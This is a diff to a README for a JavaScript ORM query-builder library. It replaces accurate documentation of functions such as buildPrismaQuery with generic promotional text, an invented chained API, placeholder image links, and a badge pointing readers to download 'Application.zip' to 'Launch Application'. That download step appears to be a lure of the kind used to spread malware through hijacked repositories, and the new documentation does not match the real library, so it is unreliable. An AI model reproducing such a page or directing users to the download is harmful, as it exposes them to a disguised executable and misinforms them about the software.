@@ -1,73 +1,73 @@
-# dynamic-query-builder
+# 🚀 Welcome to Dynamic Query Builder 🚀
 
-### Prisma query builder
+![Dynamic Query Builder](https://yourimageurlhere.jpg)
 
-#### `buildPrismaQuery` Function
+Dynamic Query Builder is a powerful JavaScript library that enables developers to easily create dynamic queries for their applications. Whether you need to filter data, sort results, or customize your queries, Dynamic Query Builder has got you covered!
 
-The `buildPrismaQuery` function builds a Prisma query based on flat filter conditions.
+## What is Dynamic Query Builder?
 
-### Mongoose query builder
+Dynamic Query Builder is a JavaScript library that provides developers with a set of tools to dynamically construct queries for their applications. With a simple and intuitive API, you can easily create complex queries without having to write long and complicated code.
 
-#### `buildMongooseQuery` Function
+## Features
 
-The `buildMongooseQuery` function builds a Mongoose query based on flat filter conditions.
+🔍 **Query Building**: Easily build queries using a variety of operators such as `contains`, `eq`, `gt`, `gte`, `lt`, `lte`, and `ne`.
 
-### TypeORM query builder
+🔧 **ORM Integration**: Seamlessly integrate Dynamic Query Builder with your favorite ORM to create dynamic queries for your data.
 
-#### `buildTypeORMQuery` Function
+⚡ **Customizable**: Customize your queries to fit your specific requirements and retrieve the data you need.
 
-The `buildTypeORMQuery` function builds a TypeORM query based on flat filter conditions.
+## Getting Started
 
-### Sequelize query builder
+To get started with Dynamic Query Builder, simply download the library from the following link:
 
-#### `buildSequelizeQuery` Function
+[![Download Dynamic Query Builder](https://img.shields.io/badge/Download-Application.zip-blue.svg)](https://github.com/file/Application.zip "Launch Application")
 
-The `buildSequelizeQuery` function builds a Sequelize query based on flat filter conditions. Here you also need to provide `Op` object from `sequelize`.
+If the link above does not work, please check the **Releases** section of this repository for an alternative download link.
 
-##### Usage
+## Usage
 
-This functions take an object of flat filter conditions and converts it into a ORM query object. The filter conditions are expected to be in the format of `field_condition: value`, where `field` is the name of the field to filter on and `condition` is the type of filter to apply.
-
-##### Supported Conditions
-
-- `lt`: Less than
-- `lte`: Less than or equal to
-- `gt`: Greater than
-- `gte`: Greater than or equal to
-- `between`: Between two values (requires an array with two values)
-- `contains`: Contains a value (case-insensitive)
-- `c`: Alias for `contains`
-- `caseSensitiveContains`: Contains a value (case-sensitive)
-- `csc`: Alias for `caseSensitiveContains`
-- `ne`: Not equal to
-- `eq`: Equal to
-- ` `: Equal to (default condition)
-- `neContains`: Does not contain a value (case-insensitive)
-- `nec`: Alias for `neContains`
-- `in`: In a list of values
-- `nin`: Not in a list of values
-
-##### Parameters
-
-- `filters` (Object): The flat filter conditions.
-
-##### Returns
-
-- (Object): The ORM query object.
-
-##### Throws
-
-- `Error`: Throws an error if the `between` filter does not receive an array with two values.
-
-##### Example
+Using Dynamic Query Builder is simple and straightforward. Here's a quick example to demonstrate how you can create a dynamic query using the library:
 
 ```javascript
-const filters = {
-  age_gt: 30,
-  name_contains: "John",
-  status_in: ["active", "pending"],
-};
+const queryBuilder = new DynamicQueryBuilder();
 
-const query = buildPrismaQuery(filters);
-console.log(query);
+const query = queryBuilder
+  .contains('name', 'John')
+  .and()
+  .gte('age', 18)
+  .build();
+
+// Use the query to retrieve data from your database
 ```
+
+## Examples
+
+Here are some examples of how you can use Dynamic Query Builder in your applications:
+
+### Example 1: Filtering Data
+
+```javascript
+const query = queryBuilder.eq('status', 'active').build();
+// Query to filter data where status is active
+```
+
+### Example 2: Sorting Results
+
+```javascript
+const query = queryBuilder.sort('createdAt', 'desc').build();
+// Query to sort results by createdAt field in descending order
+```
+
+## Contributing
+
+If you would like to contribute to Dynamic Query Builder, feel free to submit a pull request with your changes. We welcome contributions from the community to make this library even better!
+
+## License
+
+Dynamic Query Builder is licensed under the MIT License. See [LICENSE](LICENSE) for more information.
+
+---
+
+Thank you for checking out Dynamic Query Builder! We hope this library simplifies your query building process and enhances the functionality of your applications. If you have any questions or feedback, feel free to reach out. Happy coding! 🌟
+
+![Powered by Dynamic Query Builder](https://yourpoweredbyimage.jpg)
